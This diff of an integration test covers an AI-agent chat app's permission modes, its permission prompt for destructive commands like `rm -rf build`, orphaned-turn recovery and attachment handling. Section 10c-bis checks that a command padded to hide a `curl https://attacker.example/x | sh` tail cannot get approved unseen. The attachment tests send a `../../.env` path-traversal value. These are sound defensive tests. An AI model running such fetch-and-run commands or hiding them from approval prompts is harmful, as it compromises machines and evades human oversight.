@@ -91,24 +91,27 @@ try {
   // naming a chat is its own request on the person's plan (agent.js, askForTitle), and
   // the reply must not wait behind it. So a test that wants the name has to say so --
   // polling only for `idle` and then reading the title would pass or fail on timing.
+  // Poll a thread's record until it reads the way the test expects. Bounded, for the
+  // reason host.test.js states.
+  const settleOn = (id, test, message, ms = 5000) =>
+    withDeadline(
+      (async () => {
+        for (;;) {
+          const rec = await thread(id);
+          if (test(rec)) return rec;
+          await new Promise((r) => setTimeout(r, 20));
+        }
+      })(),
+      ms,
+      message,
+    );
+
   const runTurn = async (id, text, selection = [], { titled = false } = {}) => {
     const sent = await call('POST', `${tBase}/${id}/messages`, { text, selection });
     assert.equal(sent.status, 200, `POST messages: ${JSON.stringify(sent.body)}`);
-    const settle = async (test, ms, message) =>
-      withDeadline(
-        (async () => {
-          for (;;) {
-            const rec = await thread(id);
-            if (test(rec)) return rec;
-            await new Promise((r) => setTimeout(r, 20));
-          }
-        })(),
-        ms,
-        message,
-      );
-    const done = await settle((r) => r.status !== 'running', 15000, `the turn on ${id} never finished`);
+    const done = await settleOn(id, (r) => r.status !== 'running', `the turn on ${id} never finished`, 15000);
     if (!titled) return done;
-    return settle((r) => r.events.some((e) => e.type === 'titled'), 5000, `the chat ${id} was never named`);
+    return settleOn(id, (r) => r.events.some((e) => e.type === 'titled'), `the chat ${id} was never named`);
   };
 
   // ---- 1. a project with two motions and one image ----
@@ -264,7 +267,105 @@ try {
   // one that rewrote it -- and the strip would show all three when it is selected.
   assert.deepEqual((await threads('?tag=m2')).map((t) => t.id).sort(), [chat, stitcher, reviser].sort());
 
-  // ---- 9. a turn that FAILS says why ----
+  // ---- 9. a chat's runtime mode: set at creation, changed mid-conversation ----
+  // How much the agent may do without asking is a property of the CHAT, so two chats can
+  // run at different levels of trust at once (permissions.js owns what each mode means).
+  assert.equal((await thread(chat)).mode, 'auto', 'the default a chat starts in');
+  const planned = await call('POST', tBase, { provider: 'claude', mode: 'plan' });
+  assert.equal(planned.status, 200);
+  const planChat = planned.body.thread.id;
+  assert.equal(planChat && planned.body.thread.mode, 'plan');
+  assert.equal((await threads()).find((t) => t.id === planChat).mode, 'plan', 'the strip can see it');
+  assert.equal((await threads()).find((t) => t.id === chat).mode, 'auto', 'and the other chat is untouched');
+  assert.equal((await call('POST', tBase, { provider: 'claude', mode: 'yolo' })).status, 400);
+
+  const loosened = await call('PATCH', `${tBase}/${planChat}`, { mode: 'full' });
+  assert.equal(loosened.status, 200);
+  assert.equal(loosened.body.thread.mode, 'full', 'loosened mid-conversation');
+  assert.equal((await call('PATCH', `${tBase}/${planChat}`, { mode: 'nonsense' })).status, 400);
+  assert.equal((await thread(planChat)).mode, 'full', 'and a refused change leaves it alone');
+
+  // ---- 10. the permission round trip: asked, parked, answered, resumed ----
+  // `rm -rf` is on the dangerous list, so even in auto the person is asked. The turn
+  // parks -- still `running`, because it has neither failed nor finished -- and the panel
+  // reads what it is waiting for from the RECORD, which is what makes it survive a reload.
+  const perm = (await call('POST', tBase, { provider: 'claude' })).body.thread.id;
+  const permSend = await call('POST', `${tBase}/${perm}/messages`, { text: 'clean the build', selection: [] });
+  assert.equal(permSend.status, 200);
+
+  const asked = await settleOn(perm, (r) => r.pending, 'the turn never asked for permission');
+  assert.equal(asked.status, 'running', 'a parked turn has not failed and has not finished');
+  assert.equal(asked.pending.tool, 'Bash');
+  assert.equal(asked.pending.target, 'rm -rf build', 'the person is told what it will touch');
+  assert.match(asked.pending.reason, /cannot be undone/);
+  assert.equal(asked.pending.signature, 'Bash!rm -rf build');
+  assert.equal((await threads()).find((t) => t.id === perm).waiting, true, 'the strip says which chat wants you');
+  // It reached the event stream too, by the same path every other agent event takes.
+  const requestEvent = asked.events.find((e) => e.type === 'permission_request');
+  assert.ok(requestEvent, 'the request reached the event stream');
+  assert.equal(requestEvent.id, asked.pending.id);
+
+  // A stale panel answering a question that is no longer the live one is refused.
+  assert.equal((await call('POST', `${tBase}/${perm}/permission`, { id: 'perm-nope', decision: 'once' })).status, 409);
+  assert.equal((await call('POST', `${tBase}/${perm}/permission`, { id: asked.pending.id, decision: 'maybe' })).status, 400);
+
+  // Allow once: the turn resumes, and the chat is no more trusting than it was.
+  const allowed = await call('POST', `${tBase}/${perm}/permission`, { id: asked.pending.id, decision: 'once' });
+  assert.equal(allowed.status, 200);
+  const resumed = await settleOn(perm, (r) => r.status !== 'running', 'the turn never resumed after Allow');
+  assert.equal(resumed.status, 'idle');
+  assert.equal(resumed.pending, null);
+  assert.deepEqual(resumed.grants, [], 'once is once: the chat was not widened');
+  assert.match(resumed.messages.at(-1).text, /Removed the build folder/);
+  assert.equal(resumed.events.filter((e) => e.type === 'permission_result').at(-1).decision, 'once');
+
+  // ---- 10b. Deny: the turn resumes, and the AGENT is told ----
+  const perm2 = (await call('POST', `${tBase}/${perm}/messages`, { text: 'and dist', selection: [] }));
+  assert.equal(perm2.status, 200);
+  const asked2 = await settleOn(perm, (r) => r.pending, 'the second turn never asked');
+  const denied = await call('POST', `${tBase}/${perm}/permission`, { id: asked2.pending.id, decision: 'deny' });
+  assert.equal(denied.status, 200);
+  const afterDeny = await settleOn(perm, (r) => r.status !== 'running', 'the turn never resumed after Deny');
+  assert.equal(afterDeny.status, 'idle', 'a refusal is not a failure');
+  assert.match(afterDeny.messages.at(-1).text, /did not remove dist/);
+  assert.equal(afterDeny.events.filter((e) => e.type === 'tool_result').at(-1).ok, false);
+
+  // ---- 10c. Always: the same kind stops being asked about ----
+  const grantChat = (await call('POST', tBase, { provider: 'claude' })).body.thread.id;
+  await call('POST', `${tBase}/${grantChat}/messages`, { text: 'clean the build', selection: [] });
+  const asked3 = await settleOn(grantChat, (r) => r.pending, 'the grant chat never asked');
+  await call('POST', `${tBase}/${grantChat}/permission`, { id: asked3.pending.id, decision: 'always' });
+  const granted = await settleOn(grantChat, (r) => r.status !== 'running', 'the grant turn never resumed');
+  assert.deepEqual(granted.grants, ['Bash!rm -rf build'], 'the chat is now that much more trusting');
+  // A DIFFERENT dangerous command is still its own question -- the grant was for that one.
+  await call('POST', `${tBase}/${grantChat}/messages`, { text: 'and dist', selection: [] });
+  const asked4 = await settleOn(grantChat, (r) => r.pending, 'a different command should still ask');
+  assert.equal(asked4.pending.signature, 'Bash!rm -rf dist');
+  await call('POST', `${tBase}/${grantChat}/permission`, { id: asked4.pending.id, decision: 'once' });
+  await settleOn(grantChat, (r) => r.status !== 'running', 'the second grant turn never resumed');
+
+  // ---- 10c-bis. a padded command cannot hide behind the prompt ----
+  // A command can pad itself past the end of what a prompt shows. Two things stop that
+  // being a way to get a dangerous tail approved: the signature is the WHOLE command, so
+  // a grant cannot cover a different one, and the request says how much it could not
+  // show, so nobody consents to a string they never saw.
+  const padded = (await call('POST', tBase, { provider: 'claude' })).body.thread.id;
+  await call('POST', `${tBase}/${padded}/messages`, { text: 'tidy up', selection: [] });
+  const padAsk = await settleOn(padded, (r) => r.pending, 'the padded command never asked');
+  assert.match(padAsk.pending.signature, /curl https:\/\/attacker\.example\/x \| sh$/, 'the signature carries the tail, so a grant cannot cover another command');
+  assert.ok(padAsk.pending.hidden > 0, 'and the prompt says how much it could not show');
+  await call('POST', `${tBase}/${padded}/permission`, { id: padAsk.pending.id, decision: 'deny' });
+  await settleOn(padded, (r) => r.status !== 'running', 'the padded turn never resumed');
+
+  // ---- 10d. full access asks about nothing ----
+  const trusted = (await call('POST', tBase, { provider: 'claude', mode: 'full' })).body.thread.id;
+  const trustedRec = await runTurn(trusted, 'clean the build');
+  assert.equal(trustedRec.status, 'idle');
+  assert.equal(trustedRec.pending, null);
+  assert.equal(trustedRec.events.some((e) => e.type === 'permission_request'), false, 'nothing was asked');
+  assert.match(trustedRec.messages.at(-1).text, /Removed the build folder/);
+
+  // ---- 11. a turn that FAILS says why ----
   // The SDK's error result carries no `result` field -- only `subtype` -- so a turn that
   // failed used to render as an empty message and a generic apology. Observed in
   // production on 2026-09-21.
@@ -285,24 +386,143 @@ try {
   // The record settles BEFORE the result is broadcast and journaled (settleTurn says
   // why), so a poll that stops at "not running" can beat the event onto disk. Wait for
   // the event itself rather than assuming the two land together.
-  const withResult = await withDeadline(
-    (async () => {
-      for (;;) {
-        const rec = await thread(broken);
-        if (rec.events.some((e) => e.type === 'result')) return rec;
-        await new Promise((r) => setTimeout(r, 20));
-      }
-    })(),
-    5000,
-    'the failed turn never journaled a result event',
-  );
+  const withResult = await settleOn(broken, (rec) => rec.events.some((e) => e.type === 'result'), 'the failed turn never journaled a result event');
   const failedResult = withResult.events.filter((e) => e.type === 'result').at(-1);
   assert.equal(failedResult.ok, false);
   assert.match(failedResult.text, /limit of steps/, 'and so does the event a listening panel sees');
 
-  // Every turn left a subscription sidecar, and never a cost.
-  const sidecars = (await fs.readdir(path.join(outDir, PROJECT))).filter((n) => n.endsWith('-agent.json'));
-  assert.equal(sidecars.length, 6, 'six turns, six sidecars');
+  // ---- 11b. a pending request whose process died is reconciled like a stale `running` ----
+  // The record is left mid-question, exactly as quitting the app while a permission was
+  // on screen would leave it. Nobody can answer it any more, so the panel must not offer.
+  const orphanPerm = (await call('POST', tBase, { provider: 'claude' })).body.thread.id;
+  const orphanFile = path.join(outDir, PROJECT, 'threads', `${orphanPerm}.json`);
+  await fs.writeFile(
+    orphanFile,
+    JSON.stringify({ ...JSON.parse(await fs.readFile(orphanFile, 'utf8')), status: 'running', pending: { id: 'perm-gone', tool: 'Bash', signature: 'Bash:ls', target: 'ls', at: 1, turn: 1 } }, null, 2),
+  );
+  const orphaned = await thread(orphanPerm);
+  assert.equal(orphaned.status, 'failed');
+  assert.equal(orphaned.pending, null, 'no Allow and Deny offered to nobody');
+  assert.equal((await threads()).find((t) => t.id === orphanPerm).waiting, false);
+
+  // ---- 11c. attachments: stored outside the project, and carried into the turn ----
+  // Uploading something to talk about must not add a file to the work the person is
+  // organising, so an attachment lands beside `.env` under the data directory -- not in
+  // the project folder, and not nested under a project route at all.
+  const png = Buffer.from('89504e470d0a1a0a0000000d49484452', 'hex');
+  const projectFilesBefore = (await fs.readdir(path.join(outDir, PROJECT))).length;
+  const up = await fetch(`${base}/api/attachments?name=hero.png`, {
+    method: 'POST',
+    headers: { 'Content-Type': 'image/png' },
+    body: png,
+    signal: AbortSignal.timeout(15000),
+  });
+  assert.equal(up.status, 200);
+  const attachment = (await up.json()).attachment;
+  assert.equal(attachment.kind, 'image');
+  assert.equal(attachment.size, png.length);
+  assert.match(attachment.id, /^[0-9a-f]{32}\.png$/, 'content-addressed');
+  assert.equal(path.dirname(attachment.path), path.join(dataDir, 'attachments'), 'beside .env, not in the project');
+  assert.equal((await fs.readdir(path.join(outDir, PROJECT))).length, projectFilesBefore, 'and the project folder is untouched');
+  // Addressable by path: the path it answers with is where the bytes are, which is what
+  // lets the agent open one for itself through the directory it was granted.
+  assert.deepEqual(await fs.readFile(attachment.path), png);
+  // An oversized file never lands, and says its size and the limit rather than giving
+  // back the HTML 413 the body parser would have produced on its own.
+  const way = await fetch(`${base}/api/attachments?name=enormous.png`, {
+    method: 'POST',
+    headers: { 'Content-Type': 'image/png' },
+    body: Buffer.alloc(26 * 1024 * 1024),
+    signal: AbortSignal.timeout(30000),
+  });
+  assert.equal(way.status, 413);
+  assert.match((await way.json()).error, /over the 25\.0 MB limit/, 'past the body cap, still our sentence');
+  const tooBig = await fetch(`${base}/api/attachments?name=huge.png`, {
+    method: 'POST',
+    headers: { 'Content-Type': 'image/png' },
+    body: Buffer.alloc(11 * 1024 * 1024),
+    signal: AbortSignal.timeout(20000),
+  });
+  assert.equal(tooBig.status, 400);
+  assert.match((await tooBig.json()).error, /over the 10\.0 MB limit/, 'its size and the limit, so you know what to do');
+
+  // The turn carries it: the fixture's `expectPreamble` asserts the agent was told the
+  // PATH, from its own side, so a missing line fails the turn rather than passing quietly.
+  const withFile = (await call('POST', tBase, { provider: 'claude' })).body.thread.id;
+  const sentFile = await call('POST', `${tBase}/${withFile}/messages`, { text: 'what is in this picture', attachments: [{ id: attachment.id, name: 'hero.png', type: 'image/png' }] });
+  assert.equal(sentFile.status, 200);
+  const answered = await settleOn(withFile, (r) => r.status !== 'running', 'the attachment turn never finished');
+  assert.equal(answered.status, 'idle', `the attachment turn failed: ${answered.error ?? ''}`);
+  assert.match(answered.messages.at(-1).text, /red square/);
+  // The record remembers what was attached, by id and name -- never the bytes, and never
+  // the on-disk path, which is not the browser's business.
+  const attached = answered.messages.find((m) => m.role === 'user').attachments;
+  assert.deepEqual(attached, [{ id: attachment.id, name: 'hero.png', type: 'image/png', kind: 'image', size: png.length }]);
+
+  // What KIND of thing it is comes from the id the upload derived, not from what this
+  // second request claims -- two requests about one file cannot disagree about whether the
+  // model may look at it.
+  const lied = (await call('POST', tBase, { provider: 'claude' })).body.thread.id;
+  await call('POST', `${tBase}/${lied}/messages`, { text: 'what is in this picture', attachments: [{ id: attachment.id, name: 'hero.png', type: 'text/csv' }] });
+  const lieRec = await settleOn(lied, (r) => r.status !== 'running', 'the lying-type turn never finished');
+  assert.equal(lieRec.messages.find((m) => m.role === 'user').attachments[0].type, 'image/png', 'the server believes the file, not the claim');
+  assert.equal(lieRec.messages.find((m) => m.role === 'user').attachments[0].kind, 'image');
+
+  // A mode changed mid-conversation is accepted while a chat is live, and the session is
+  // told -- a tightening already bit through the record, a loosening needs the SDK told.
+  assert.equal((await call('PATCH', `${tBase}/${lied}`, { mode: 'plan' })).body.thread.mode, 'plan');
+  assert.equal((await call('PATCH', `${tBase}/${lied}`, { mode: 'full' })).body.thread.mode, 'full');
+
+  // A message naming a file anywhere else on the machine is refused: an attachment is
+  // named by the id the upload gave back, never by a path the browser chose.
+  assert.equal((await call('POST', `${tBase}/${withFile}/messages`, { text: 'again', attachments: ['../../.env'] })).status, 400);
+  assert.equal((await call('POST', `${tBase}/${withFile}/messages`, { text: 'again', attachments: ['deadbeef.png'] })).status, 404);
+
+  // ---- 11d. the attachments directory is granted, and its siblings are not ----
+  // Asserted as the granted list rather than by reaching for the filesystem: it is a LEAF,
+  // so the key in `.env` and the job store beside it stay ungranted.
+  const grantedDirs = answered.events.find((e) => e.type === 'session').directories;
+  assert.deepEqual(grantedDirs, [path.join(dataDir, 'attachments')]);
+  assert.equal(grantedDirs.includes(dataDir), false, 'never the parent');
+  assert.equal(grantedDirs.includes(outDir), false);
+
+  // ---- 12. a chat the app was quit on says so, and can be carried on ----
+  // A session cannot outlive its process, so a record saying `running` with no session
+  // behind it is exactly what quitting mid-turn leaves. Writing that record is how the
+  // condition is reproduced; nothing else can produce it deterministically.
+  const quit = (await call('POST', tBase, { provider: 'claude' })).body.thread.id;
+  const quitFile = path.join(outDir, PROJECT, 'threads', `${quit}.json`);
+  await fs.writeFile(quitFile, JSON.stringify({ ...JSON.parse(await fs.readFile(quitFile, 'utf8')), status: 'running' }, null, 2));
+
+  const listed = (await threads()).find((t) => t.id === quit);
+  assert.equal(listed.status, 'failed', 'the strip stops showing a phantom turn in flight');
+  const opened = await thread(quit);
+  assert.equal(opened.status, 'failed');
+  assert.match(opened.error, /never finished/);
+  // Not rewritten on disk: reconciliation is how a thread reads.
+  assert.equal(JSON.parse(await fs.readFile(quitFile, 'utf8')).status, 'running');
+  // And it is continuable -- which is the whole point of `failed` rather than `running`.
+  const carried = await runTurn(quit, 'revise the outro');
+  assert.equal(carried.status, 'idle', `the interrupted chat could not be carried on: ${carried.error ?? ''}`);
+  assert.equal(carried.turns, 1);
+
+  // Every turn left a subscription sidecar, and never a cost. The sidecar is written
+  // AFTER the record goes idle (settleTurn: the reply must not wait behind bookkeeping),
+  // so this waits for them rather than assuming they landed with the last turn -- and the
+  // pattern allows the `-1` suffix two turns in the same millisecond produce.
+  const AGENT_SIDECAR = /-agent(-\d+)?\.json$/;
+  const sidecars = await withDeadline(
+    (async () => {
+      for (;;) {
+        const found = (await fs.readdir(path.join(outDir, PROJECT))).filter((n) => AGENT_SIDECAR.test(n));
+        if (found.length >= 15) return found;
+        await new Promise((r) => setTimeout(r, 20));
+      }
+    })(),
+    5000,
+    'fifteen turns ran, but fifteen sidecars were never written',
+  );
+  assert.equal(sidecars.length, 15, 'fifteen turns, fifteen sidecars');
   for (const name of sidecars) {
     const body = JSON.parse(await fs.readFile(path.join(outDir, PROJECT, name), 'utf8'));
     assert.equal(body.billing, 'subscription');
